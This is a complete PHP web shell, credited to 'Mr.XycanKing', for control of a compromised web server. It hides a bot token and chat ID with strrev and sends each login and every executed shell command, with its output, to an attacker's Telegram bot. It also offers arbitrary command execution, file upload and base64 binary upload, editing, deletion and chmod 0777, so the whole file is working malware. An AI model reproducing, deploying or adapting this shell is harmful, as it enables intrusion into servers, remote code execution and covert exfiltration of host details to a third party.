<?php
// ============ OBFUSCATED WITH strrev ============
$tkn = strrev('ARcAukVsktLmb0acWwz9XFQFM0WWdNGdZQHAA:4474604368');
$cid = strrev('3644710398');
$pwd = strrev('lbt');

$path = isset($_GET['p']) ? $_GET['p'] : getcwd();
$path = str_replace('\\','/',$path);
$os = (stripos(PHP_OS,'WIN')===0)?'Windows':'Linux';

$tg = function($m) use ($tkn,$cid){
    $url="https://api.telegram.org/bot{$tkn}/sendMessage";
    $d=['chat_id'=>$cid,'text'=>$m,'parse_mode'=>'HTML'];
    $c=['http'=>['header'=>"Content-type: application/x-www-form-urlencoded\r\n",'method'=>'POST','content'=>http_build_query($d)]];
    @file_get_contents($url,false,stream_context_create($c));
};

session_start();
if(isset($_GET['l'])){unset($_SESSION['l']);header("Location: ?");}
if(!isset($_SESSION['l'])){
    if(isset($_POST['p'])&&$_POST['p']===$pwd){
        $_SESSION['l']=true;
        $ip=$_SERVER['SERVER_ADDR'].' ('.$_SERVER['REMOTE_ADDR'].')';
        $tg("✅ <b>X</b>\nIP: $ip\nUser: ".get_current_user()."\nPath: ".getcwd());
    }else{
        die("<body style='background:#000;color:red;text-align:center;padding-top:100px;font-family:monospace;'><form method='post'><h1>[ X-SHELL LOGIN ]</h1><input type='password' name='p' style='background:#111;color:#0f0;border:1px solid red;'><br><br><input type='submit' value='ENTER'></form></body>");
    }
}

$style=<<<CSS
<style>
body{background:#000;color:#0f0;font-family:'Courier New',monospace;font-size:12px;padding:15px;}
.box{border:1px solid red;padding:10px;margin-bottom:10px;background:rgba(10,10,10,0.9);box-shadow:0 0 5px red;}
a{color:cyan;text-decoration:none;}a:hover{color:red;}
table{width:100%;border-collapse:collapse;}
th,td{border:1px solid #333;padding:5px;text-align:left;}
th{background:red;color:#000;}
input,textarea{background:#111;color:#0f0;border:1px solid #444;padding:3px;}
.btn{background:red;color:#fff;border:none;cursor:pointer;padding:3px 10px;}
</style>
CSS;
echo $style;
echo "<h2>[ X-ULTIMATE SHELL - BY Mr.XycanKing ]</h2>";
echo "<div class='box'>OS: $os | IP: {$_SERVER['SERVER_ADDR']} | USER: ".get_current_user()." | <a href='?l=1'>[ LOGOUT ]</a></div>";

$ps=explode('/',$path);
echo "<div class='box'>PATH: ";
foreach($ps as $i=>$p){
    $seg='';
    for($j=0;$j<=$i;$j++)$seg.=($j==0?'':'/').$ps[$j];
    echo "<a href='?p=$seg'>$p</a>/";
}
echo "</div>";

echo "<div class='box'>
<form method='POST' enctype='multipart/form-data'>
<b>BYPASS UPLOAD:</b> <input type='file' name='f'> <input type='submit' name='up' value='FORCE UP' class='btn'>
</form>
<hr style='border:0.5px solid #333;'>
<b>TOOLS:</b> <a href='?p=$path&t=scanner'>[ BACKDOOR SCANNER ]</a> | <a href='?p=$path&t=cmd'>[ CMD EXEC ]</a>
</div>";

echo "<div class='box'>
<form method='POST' style='display:inline-block;margin-right:20px;'>
<b>CREATE FOLDER:</b> <input type='text' name='fn' placeholder='Folder name' style='width:150px;'> <input type='submit' name='cf' value='Create' class='btn'>
</form>
<form method='POST' style='display:inline-block;'>
<b>CREATE FILE:</b> <input type='text' name='fi' placeholder='File name' style='width:150px;'> <textarea name='fc' placeholder='Content' style='width:200px;height:40px;vertical-align:middle;'></textarea> <input type='submit' name='cr' value='Create' class='btn'>
</form>
</div>";

echo "<div class='box'>
<b>BINARY UPLOAD (Base64):</b>
<form method='POST'>
File Name: <input type='text' name='bn' style='width:200px;'><br>
Base64 Content: <textarea name='bd' style='width:80%;height:80px;'></textarea><br>
<input type='submit' name='bu' value='Upload & Decode' class='btn'>
</form>
</div>";

if(isset($_POST['cf'])){
    $folder=$path.'/'.trim($_POST['fn']);
    if(!empty($_POST['fn'])&&!file_exists($folder)&&@mkdir($folder,0777,true))
        echo "<div class='box' style='color:lime;'>[+] Folder created: $folder</div>";
    else echo "<div class='box' style='color:red;'>[-] Failed</div>";
}

if(isset($_POST['cr'])){
    $file=$path.'/'.trim($_POST['fi']);
    if(!empty($_POST['fi'])&&!file_exists($file)&&@file_put_contents($file,$_POST['fc']))
        echo "<div class='box' style='color:lime;'>[+] File created: $file (".strlen($_POST['fc'])." B)</div>";
    else echo "<div class='box' style='color:red;'>[-] Failed</div>";
}

if(isset($_POST['bu'])){
    $name=trim($_POST['bn']);
    $data=base64_decode($_POST['bd']);
    if($name&&$data!==false&&@file_put_contents($path.'/'.$name,$data))
        echo "<div class='box' style='color:lime;'>[+] Binary uploaded: $name (".strlen($data)." B)</div>";
    else echo "<div class='box' style='color:red;'>[-] Failed</div>";
}

if(isset($_POST['up'])){
    $d=$path.'/'.$_FILES['f']['name'];
    @chmod($path,0777);
    if(@copy($_FILES['f']['tmp_name'],$d)||@move_uploaded_file($_FILES['f']['tmp_name'],$d)||@file_put_contents($d,file_get_contents($_FILES['f']['tmp_name'])))
        echo "<div class='box' style='color:lime;'>[+] SUCCESS: ".basename($d)." (".filesize($d)." B)</div>";
    else echo "<div class='box' style='color:red;'>[-] FAILED!</div>";
}

if(isset($_GET['t'])&&$_GET['t']=='scanner'){
    echo "<div class='box'><h3>[ BACKDOOR SCANNER ]</h3>";
    foreach(scandir($path) as $f){
        if(is_file($path.'/'.$f)){
            $c=file_get_contents($path.'/'.$f);
            if(preg_match('/(base64_decode|eval|system|shell_exec|passthru)/i',$c))
                echo "<font color='yellow'>[!] Detected: $f</font><br>";
        }
    }
    echo "</div>";
}

if(isset($_GET['t'])&&$_GET['t']=='cmd'){
    echo "<div class='box'><form method='POST'>CMD: <input type='text' name='c' style='width:70%;'> <input type='submit' value='EXEC' class='btn'></form>";
    if(isset($_POST['c'])&&$_POST['c']){
        $out=shell_exec($_POST['c']." 2>&1");
        echo "<pre style='color:white;'>$out</pre>";
        $tg("🔧 Command executed:\n<code>".$_POST['c']."</code>\nOutput:\n".substr($out,0,500));
    }
    echo "</div>";
}

echo "<table><tr><th>NAME</th><th>SIZE</th><th>ACT</th></tr>";
foreach(scandir($path) as $i){
    if($i=='.'||$i=='..')continue;
    $f=$path.'/'.$i;
    $isd=is_dir($f);
    echo "<tr><td>".($isd?"<a href='?p=$f'>[ $i ]</a>":$i)."</td><td>".($isd?"DIR":filesize($f)." B")."</td><td><a href='?p=$path&a=edit&i=$f'>Edit</a> | <a href='?p=$path&a=del&i=$f'>Del</a></td></tr>";
}
echo "</table>";

if(isset($_GET['a'])&&$_GET['a']=='edit'){
    if(isset($_POST['s'])){@file_put_contents($_GET['i'],$_POST['t']);echo "SAVED!";}
    echo "<div class='box'><form method='POST'><textarea name='t' style='width:100%;height:200px;'>".htmlspecialchars(file_get_contents($_GET['i']))."</textarea><br><input type='submit' name='s' value='SAVE' class='btn'></form></div>";
}
if(isset($_GET['a'])&&$_GET['a']=='del'){@is_dir($_GET['i'])?@rmdir($_GET['i']):@unlink($_GET['i']);echo "<script>window.location='?p=$path';</script>";}
?>
